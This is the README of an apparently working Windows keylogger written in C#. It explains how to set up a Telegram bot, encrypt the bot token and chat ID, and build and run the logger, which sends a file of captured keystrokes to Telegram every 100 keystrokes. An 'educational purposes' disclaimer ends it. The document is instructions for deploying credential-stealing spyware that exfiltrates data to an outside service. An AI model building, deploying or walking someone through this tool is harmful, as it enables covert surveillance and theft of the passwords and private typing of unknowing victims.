# A simple keylogger
a simple windows based keylogger in C#

## Build and Run

### create telegram bot
- create a bot via @BotFather
- copy your bot token
- get your chat ID: click start in your bot then visit:
	https://api.telegram.org/bot<TOKEN>/getUpdates
- copy the chat.id number

### compile and run encrypt with your bot credentials
```bash
cd encrypt
dotnet build
encrypt.exe "tg_token" "chat_id"
```
### Builing the keylog mechanism
```bash
cd logger
# update Program.cs with your encrypted creds from above
dotnet build
keylogger.exe
```

Every 100 keystrokes, a .txt file lands in your telegram


# Disclaimer
"""
DISCLAIMER: This is solely for educational purposes. It is intended for use only in 
authorized testing environments where you have explicit permission from 
the system owner.

I assume no liability for any misuse or damage caused by this.

By using this software, you acknowledge that you have read and agreed to 
use it responsibly and ethically.
"""   